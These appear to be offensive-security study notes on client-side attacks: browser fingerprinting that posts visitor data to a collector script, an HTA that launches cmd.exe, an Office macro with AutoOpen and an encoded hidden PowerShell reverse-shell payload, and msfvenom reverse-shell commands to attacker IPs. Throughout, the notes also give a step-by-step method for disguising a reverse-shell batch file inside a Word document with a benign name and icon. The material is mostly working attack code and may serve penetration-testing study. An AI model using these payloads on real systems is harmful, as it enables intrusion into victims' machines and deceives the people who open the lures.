# Browser Fingerprinting
## Tool: Fingerprintjs2 JavaScript library
[link here](https://github.com/LukasDrgon/fingerprintjs2/fork)
### sample: prints out the user-agent and platform components
```html
<!doctype html>
<html>
	<script src="fingerprint2.js"></script>
	<script>
		var details = "<strong>Detailed Information: </strong><br />";
		new Fingerprint2().get(function(result, components){
			var values = components.map(function (component) { return component.value })
			for (var index in components){
				var obj = components[index];
				if(obj.key.toString() == "user_agent" || obj.key.toString() == "navigator_platform"){
					var line = "<strong>" + obj.key + "</strong>" + ": " + obj.value.toString() + "<br />";
					details += line;
				}
			}
			document.write(details);
		});
	</script>
</html>
```

## parse user agent
https://developers.whatismybrowser.com/useragents/parse/#parse-useragent

## fingerprinting with AJAX: 
### Note:
*In this example,* the POST request is issued against the same server where the malicious web page is stored, therefore the URL used in the `xmlhttp.open` method does not specify an IP address.

A comment is added for when targeting a remote server
```html
<!doctype html>
<html>
	<script src="fingerprint2.js"></script>
	<script>
		var details = "<strong>Detailed Information: </strong><br />";
		new Fingerprint2().get(function(result, components){
			var values = components.map(function (component) { return component.value })
			for (var index in components){
				var obj = components[index];
				if(obj.key.toString() == "user_agent" || obj.key.toString() == "navigator_platform"){
					var line = "<strong>" + obj.key + "</strong>" + ": " + obj.value.toString() + "<br />";
					details += line;
				}
			}
			var xmlhttp = new XMLHttpRequest();
			xmlhttp.open("POST", "/fp/js.php");
			//example with a remote url
			//xmlhttp.open("POST", "http://20.20.20.129/fp/js.php");
			xmlhttp.setRequestHeader("Content-Type", "application/txt");
			xmlhttp.send(details);
		});
	</script>
</html>
```

## js.php for receiving the ajax: note: we have to `chown www-data:www-data /var/www/html/fp` directory to allow it to write the fingerprint data to a local txt file
```php
<?php
	$data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
	$data .= file_get_contents('php://input');
	$data .= "---------------------------------\n\n";
	file_put_contents('/var/www/html/fp/fingerprint.txt', print_r($data, true), FILE_APPEND | LOCK_EX);
?>
```

## sample output: `cat fingerprint.txt`
```
Client IP Address: 127.0.0.1
<strong>Detailed Information: </strong><br /><strong>user_agent</strong>: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br /><strong>navigator_platform</strong>: Linux x86_64<br />---------------------------------

Client IP Address: 20.20.20.132
<strong>Detailed Information: </strong><br /><strong>user_agent</strong>: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br /><strong>navigator_platform</strong>: Linux x86_64<br />---------------------------------
```

---

# HTML Applications (HTA)

### sample hta
```html
<html>
	<head>
		<script>
			var c= 'cmd.exe'
			new ActiveXObject('WScript.Shell').Run(c);
		</script>
	<head>
	<body>
		<script>
			//closes the additional windows behind our command prompt
			self.close();
		</script>
	</body>
</html>
```

- sandbox protection of Internet Explorer, also called Protected Mode is enabled by default
- The victim can select Allow to permit the action,
	which will execute the **JavaScript code** and launch cmd.exe

### Generating HTA with `msfvenom`
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f hta-psh -o evil.hta
```

### CVE-2017-0199

### [Demiguise Tool](https://github.com/nccgroup/demiguise)

---

# Office Macros
### macro layout
```vbscript
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String

    <PAYLOAD>

    CreateObject("Wscript.Shell").Run Str
End Sub
```

### Payload is the same as the HTA attack
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f hta-psh
```
In VBA, for strings, there is a character limit of 255 characters.

However, this restriction does not apply to strings stored in variables, so we can split the command into multiple lines and concatenate them.

it should be like below: 

```vbscript
Str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAF"
Str = Str + "AAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkA"
```

the powershell script in the **MurderShell project** can take care of the splitting.

---

# Object Linking and Embedding (Awesome)

## Step #1: create a malicous bat file and give it a benign name like `OfficeUpdater.bat`
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=20.20.20.129 LPORT=9000 -f psh-cmd -o OfficeUpdater.bat
```
## Step #2: create an office word document. click `insert` --> `object`
![CSA-OLE-1](/Assets/CSA-Object-Linking-and-Embedding/CSA-OLE-1.jpg)

## Step #3: After selecting the `create from file` tab, browse to the location of the `.bat` file we generated. Also use a benign `icon` and `caption` to lower suspicion.
![CSA-OLE-2](/Assets/CSA-Object-Linking-and-Embedding/CSA-OLE-2.jpg)

![CSA-OLE-3](/Assets/CSA-Object-Linking-and-Embedding/CSA-OLE-3.jpg)

## Step #4: When the user clicks on the object, a pop-up will be there asking if the user wants to run it.
![CSA-OLE-4](/Assets/CSA-Object-Linking-and-Embedding/CSA-OLE-4.jpg)

## You will get back a shell if `'Run'` is clicked
![CSA-OLE-5](/Assets/CSA-Object-Linking-and-Embedding/CSA-OLE-5.jpg)